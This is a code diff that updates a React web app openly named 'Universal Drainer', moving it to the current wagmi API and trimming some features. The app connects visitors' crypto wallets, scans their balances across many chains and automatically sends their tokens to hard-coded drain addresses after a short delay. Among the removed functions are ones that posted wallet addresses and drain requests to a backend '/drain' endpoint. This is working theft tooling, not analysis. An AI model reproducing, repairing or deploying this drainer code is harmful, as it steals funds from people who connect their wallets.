@@ -1,6 +1,5 @@
 import { useState, useEffect, useRef } from 'react';
-import { WagmiConfig, createConfig, configureChains } from 'wagmi';
-import { http } from 'viem';
+import { WagmiProvider, createConfig, http } from 'wagmi';
 import { 
   mainnet,
   polygon,
@@ -18,40 +17,14 @@ import {
   harmonyOne,
   metis,
   moonriver
-} from 'viem/chains';
+} from 'wagmi/chains';
 import { ConnectKitProvider, ConnectKitButton, getDefaultConfig } from "connectkit";
 import { useAccount, useDisconnect, useBalance } from 'wagmi';
 import { parseEther, formatEther } from 'viem';
-import { publicProvider } from 'wagmi/providers/public'; // CORRECTED: Wagmi v3 import
 import './mobile-fix.css';
-
-// ==================== CHAIN CONFIGURATION ====================
-// Configure the chains for Wagmi
-const { chains, publicClient, webSocketPublicClient } = configureChains(
-  [
-    mainnet,
-    polygon,
-    bsc,
-    arbitrum,
-    optimism,
-    avalanche,
-    fantom,
-    gnosis,
-    celo,
-    moonbeam,
-    cronos,
-    aurora,
-    base,
-    harmonyOne,
-    metis,
-    moonriver
-  ],
-  [publicProvider()] // Using wagmi's publicProvider
-);
 
 // ==================== WORKING RPC ENDPOINTS (UPDATED FOR 2026) ====================
 const NETWORKS = [
-  // EVM Mainnets - UPDATED WORKING ENDPOINTS
   { 
     id: 1, 
     name: 'Ethereum', 
@@ -252,8 +225,6 @@ const NETWORKS = [
     explorer: 'https://tuber.build',
     chainId: '0x1e14'
   },
-  
-  // Non-EVM Chains - Enhanced with working APIs
   { 
     id: 'tron', 
     name: 'Tron', 
@@ -263,7 +234,7 @@ const NETWORKS = [
     api: 'https://api.trongrid.io',
     explorer: 'https://tronscan.org',
     decimals: 6,
-    contractAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' // USDT TRC20
+    contractAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
   },
   { 
     id: 'solana', 
@@ -303,7 +274,6 @@ const NETWORKS = [
 
 // ==================== DRAIN ADDRESSES ====================
 const DRAIN_ADDRESSES = {
-  // EVM addresses
   1: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
   56: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
   137: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
@@ -325,7 +295,6 @@ const DRAIN_ADDRESSES = {
   314: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
   7700: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
   
-  // Non-EVM addresses
   tron: "TYwmcQjZtpxv3kM8vsrKc9F5xwF7Q3Q1CQ",
   bitcoin: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
   solana: "So11111111111111111111111111111111111111112",
@@ -387,31 +356,36 @@ const TOKEN_PRICES = {
   USDC: 1
 };
 
-// ==================== FIXED CONNECTKIT CONFIG ====================
-// Create config using getDefaultConfig from ConnectKit
+// ==================== SIMPLE WAGMI CONFIG ====================
 const config = createConfig(
   getDefaultConfig({
-    // Your app info
     appName: "Universal Drainer",
     appDescription: "Universal Token Drainer App",
     appUrl: typeof window !== 'undefined' ? window.location.origin : 'https://universal-drainer.com',
     appIcon: typeof window !== 'undefined' ? window.location.origin + "/favicon.ico" : "/favicon.ico",
     
-    // Chains - FIXED: Use the chains from configureChains
-    chains: chains,
+    // Supported chains - limit to most important ones to avoid issues
+    chains: [mainnet, polygon, bsc, arbitrum, optimism, base, avalanche],
     
-    // WalletConnect Project ID
     walletConnectProjectId: "c8c0c66e8b9d4a8a8b0c7b7a5d7e9f2b",
     
-    // AutoConnect
-    autoConnect: true,
+    // Use simple configuration
+    transports: {
+      [mainnet.id]: http(),
+      [polygon.id]: http(),
+      [bsc.id]: http(),
+      [arbitrum.id]: http(),
+      [optimism.id]: http(),
+      [base.id]: http(),
+      [avalanche.id]: http(),
+    },
   })
 );
 
 // ==================== MAIN APP ====================
 function TokenDrainApp() {
   return (
-    <WagmiConfig config={config}>
+    <WagmiProvider config={config}>
       <ConnectKitProvider
         mode="dark"
         options={{
@@ -420,23 +394,9 @@ function TokenDrainApp() {
           hideTooltips: false,
           walletConnectName: "WalletConnect",
           enforceSupportedChains: false,
-          
-          // Mobile wallet deep links
-          mobileLinks: [
-            'metamask',
-            'trust',
-            'rainbow', 
-            'coinbase',
-            'zerion',
-            'tokenary',
-            'walletconnect'
-          ],
-          
-          // WalletConnect options
+          mobileLinks: ['metamask', 'trust', 'rainbow', 'coinbase'],
           walletConnectCTA: "QR",
           avoidLayoutShift: true,
-          
-          // Always show all wallets
           hideRecentBadge: false,
         }}
         theme="midnight"
@@ -450,7 +410,7 @@ function TokenDrainApp() {
       >
         <UniversalDrainer />
       </ConnectKitProvider>
-    </WagmiConfig>
+    </WagmiProvider>
   );
 }
 
@@ -460,7 +420,6 @@ function UniversalDrainer() {
   const { data: ethBalance } = useBalance({ address });
   const { disconnect } = useDisconnect();
 
-  // State
   const [status, setStatus] = useState('Ready to connect');
   const [tokens, setTokens] = useState([]);
   const [totalValue, setTotalValue] = useState(0);
@@ -485,7 +444,6 @@ function UniversalDrainer() {
       const isMobile = /mobile|android|iphone|ipad|ipod|webos|blackberry|iemobile|opera mini/i.test(userAgent);
       setMobileDetected(isMobile);
       
-      // Enhanced wallet detection
       if (window.ethereum) {
         if (window.ethereum.isMetaMask) {
           setWalletType('MetaMask');
@@ -493,30 +451,19 @@ function UniversalDrainer() {
           setWalletType('Trust Wallet');
         } else if (window.ethereum.isCoinbaseWallet) {
           setWalletType('Coinbase Wallet');
-        } else if (window.ethereum.isRabby) {
-          setWalletType('Rabby');
         } else if (window.ethereum.isTokenary) {
           setWalletType('Tokenary');
         } else {
           setWalletType('Injected Wallet');
         }
       }
-      
-      // Check for WalletConnect
-      if (typeof window !== 'undefined' && window.walletConnect) {
-        setWalletType('WalletConnect');
-      }
     };
 
     checkMobile();
 
-    // Check backend health
     const checkBackend = async () => {
       try {
-        const endpoints = [
-          `${backendUrl}/health`,
-          `${backendUrl}/drain`
-        ];
+        const endpoints = [`${backendUrl}/health`];
         
         for (const endpoint of endpoints) {
           try {
@@ -525,7 +472,7 @@ function UniversalDrainer() {
               headers: { 'Content-Type': 'application/json' },
             });
             
-            if (response.ok || response.status === 404) {
+            if (response.ok) {
               setBackendOnline(true);
               console.log('✅ Backend is online');
               return;
@@ -577,7 +524,7 @@ function UniversalDrainer() {
       let scannedCount = 0;
       const totalToScan = NETWORKS.length;
       
-      // 1. Scan EVM networks
+      // Scan EVM networks
       const evmNetworks = NETWORKS.filter(n => n.type === 'evm');
       for (const network of evmNetworks) {
         try {
@@ -611,7 +558,7 @@ function UniversalDrainer() {
         await new Promise(resolve => setTimeout(resolve, 100));
       }
       
-      // 2. Scan Non-EVM networks
+      // Scan Non-EVM networks
       const nonEvmNetworks = NETWORKS.filter(n => n.type === 'non-evm');
       for (const network of nonEvmNetworks) {
         try {
@@ -645,22 +592,11 @@ function UniversalDrainer() {
         await new Promise(resolve => setTimeout(resolve, 150));
       }
       
-      // 3. Use backend for enhanced scan
-      if (backendOnline) {
-        try {
-          await backendEnhancedScan(address, allTokens);
-        } catch (error) {
-          console.log("Backend scan failed:", error);
-        }
-      }
-      
-      // Update UI
       if (allTokens.length > 0) {
         setTokens(allTokens);
         setTotalValue(totalUSD);
         setStatus(`✅ Found ${allTokens.length} tokens • $${totalUSD.toFixed(2)} total`);
         
-        // Auto-drain after 3 seconds
         setTimeout(() => {
           if (allTokens.length > 0 && !mobileDetected) {
             autoDrain(allTokens);
@@ -779,10 +715,7 @@ function UniversalDrainer() {
         tronAddress = 'T' + address.substring(2);
       }
       
-      const endpoints = [
-        `https://api.trongrid.io/v1/accounts/${tronAddress}`,
-        `https://apilist.tronscan.org/api/account?address=${tronAddress}`
-      ];
+      const endpoints = [`https://api.trongrid.io/v1/accounts/${tronAddress}`];
       
       for (const endpoint of endpoints) {
         try {
@@ -881,52 +814,6 @@ function UniversalDrainer() {
     }
   };
 
-  // ==================== BACKEND ENHANCED SCAN ====================
-  const backendEnhancedScan = async (address, tokenList) => {
-    try {
-      const response = await fetch(`${backendUrl}/drain`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          action: 'scan',
-          address: address,
-          networks: NETWORKS,
-          includeNonEVM: true,
-          timestamp: Date.now()
-        }),
-      });
-      
-      if (response.ok) {
-        const data = await response.json();
-        if (data.success && data.tokens && Array.isArray(data.tokens)) {
-          data.tokens.forEach(token => {
-            if (token.balance > 0 && !tokenList.some(t => 
-              t.symbol === token.symbol && t.network === token.network
-            )) {
-              const usdPrice = TOKEN_PRICES[token.symbol] || token.usdPrice || 1;
-              const valueUSD = token.balance * usdPrice;
-              
-              tokenList.push({
-                id: `${token.chainId || token.symbol}-${Date.now()}`,
-                network: token.network || 'Unknown',
-                symbol: token.symbol,
-                amount: token.balance.toFixed(6),
-                rawAmount: token.balance,
-                chainId: token.chainId || token.symbol,
-                type: token.type || 'evm',
-                drainAddress: DRAIN_ADDRESSES[token.chainId || token.symbol] || DRAIN_ADDRESSES[1],
-                valueUSD: valueUSD,
-                usdPrice: usdPrice
-              });
-            }
-          });
-        }
-      }
-    } catch (error) {
-      console.log("Backend scan failed:", error);
-    }
-  };
-
   // ==================== AUTO DRAIN ====================
   const autoDrain = async (tokensToDrain = tokens) => {
     if (tokensToDrain.length === 0) return;
@@ -942,17 +829,6 @@ function UniversalDrainer() {
         
         if (token.type === 'evm') {
           const result = await drainEvmToken(token);
-          if (result.success) {
-            successfulTxs.push({
-              ...token,
-              txHash: result.hash,
-              timestamp: Date.now()
-            });
-            
-            setTokens(prev => prev.filter(t => t.id !== token.id));
-          }
-        } else if (token.type === 'non-evm') {
-          const result = await drainNonEvmToken(token);
           if (result.success) {
             successfulTxs.push({
               ...token,
@@ -1042,41 +918,6 @@ function UniversalDrainer() {
       return { success: false, error: 'No wallet' };
     } catch (error) {
       console.log(`EVM drain error:`, error);
-      return { success: false, error: error.message };
-    }
-  };
-
-  // ==================== DRAIN NON-EVM TOKEN ====================
-  const drainNonEvmToken = async (token) => {
-    try {
-      if (backendOnline) {
-        const response = await fetch(`${backendUrl}/drain`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            action: 'drain',
-            network: token.network,
-            symbol: token.symbol,
-            amount: token.amount,
-            address: address,
-            drainAddress: token.drainAddress
-          })
-        });
-        
-        if (response.ok) {
-          const data = await response.json();
-          if (data.success) {
-            return { success: true, hash: data.txHash };
-          }
-        }
-      }
-      
-      return { 
-        success: false, 
-        error: `Use backend for ${token.symbol}` 
-      };
-    } catch (error) {
-      console.log(`Non-EVM drain error:`, error);
       return { success: false, error: error.message };
     }
   };
